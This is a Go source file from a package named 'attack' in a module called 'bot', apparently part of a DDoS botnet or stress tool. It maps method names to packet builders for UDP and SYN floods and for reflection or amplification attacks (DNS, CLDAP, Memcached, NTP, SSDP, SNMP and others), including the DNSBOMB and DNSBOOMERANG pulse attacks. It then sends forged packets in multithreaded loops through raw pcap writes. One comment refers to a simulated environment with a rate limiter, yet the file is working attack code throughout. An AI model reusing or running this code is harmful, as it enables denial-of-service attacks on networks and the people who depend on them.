package attack

import (
	"bot/packetbuilder/protocol"
	"context"
	"fmt"
	"sync"
	"time"

	"github.com/google/gopacket/pcap"
)

// AttackMethod defines the signature for attack methods, using *Layer4 as the receiver
type AttackMethod func(l *Layer4) ([][]byte, error)

// Register attack methods
var attackMethods = map[string]AttackMethod{
	"UDP":          (*Layer4).udpPacket,
	"DNSA":         (*Layer4).dnsaPacket,
	"DNS":          (*Layer4).dnsnsPacket,
	"SYN":          (*Layer4).synPacket,
	"RDP":          (*Layer4).rdpPacket,
	"CLDAP":        (*Layer4).cldapPacket,
	"MEMCACHED":    (*Layer4).memcachedPacket,
	"ARD":          (*Layer4).ardPacket,
	"NTP":          (*Layer4).ntpPacket,
	"SSDP":         (*Layer4).ssdpPacket,
	"CHARGEN":      (*Layer4).chargenPacket,
	"SNMP":         (*Layer4).snmpPacket,
	"OPENVPN":      (*Layer4).openvpnPacket,
	"TFTP":         (*Layer4).tftpPacket,
	"DNSBOMB":      (*Layer4).dnsBomb,      // Pulse attack proposed in a 2024 IEEE S&P paper
	"DNSBOOMERANG": (*Layer4).dnsBoomerang, // Newly proposed pulse-type DDoS attack
}

func (l *Layer4) StartAttack() {
	InitBandwidthLimiter() // Initialize bandwidth limiter

	// Retrieve the attack function based on the attack method
	method, exists := attackMethods[l.Method]
	if !exists {
		fmt.Printf("Unsupported attack method: %v\n", l.Method)
		return
	}
	if l.Method == "DNSBOMB" || l.Method == "DNSBOOMERANG" {
		fmt.Println("DNSBOMB or DNSBOOMERANG")
		directAttack := attackMethods[l.Method]
		for i := 0; i < 10*l.ThreadCount; i++ {
			go directAttack(l)
		}
		time.Sleep(20 * time.Second)
		return
	}

	// Call the flood attack method, passing the attack method
	l.floodAttack(method)
}

// Generic flood attack function
func (l *Layer4) floodAttack(packetsBuilder AttackMethod) {
	var wg sync.WaitGroup

	// Use AttackMethod to execute the attack method
	packets, err := packetsBuilder(l) // Pass the *Layer4 instance
	if err != nil {
		fmt.Println(err)
		return
	}

	// Launch multiple threads for the attack
	for i := 0; i < l.ThreadCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			l.attack(packets)
		}()
	}

	// Wait for all threads to complete
	wg.Wait()
}

// To avoid excessive resource consumption in a simulated environment with limited computational resources, control the attack rate
func (l *Layer4) attack(packets [][]byte) {
	// Get the network interface and open it
	interfaceName, _, err := protocol.FindInterface(l.DstIP)
	if err != nil {
		fmt.Printf("No available network interface: %v\n", err)
		return
	}
	handle, err := pcap.OpenLive(interfaceName, 1600, true, pcap.BlockForever)
	if err != nil {
		fmt.Printf("Unable to open device: %v\n", err)
		return
	}
	defer handle.Close()

	// Send forged attack packets
	for {
		select {
		case <-STOP:
			fmt.Println("Attack stopped")
			return
		default:
			for _, packet := range packets {
				// Wait for bandwidth tokens before sending
				if bandwidthLimiter != nil {
					pktSize := len(packet)
					if err := bandwidthLimiter.WaitN(context.Background(), pktSize); err != nil {
						return
					}
				}

				if err := handle.WritePacketData(packet); err != nil {
					fmt.Printf("Failed to send forged packet: %v\n", err)
					return
				}
			}
		}
	}
}
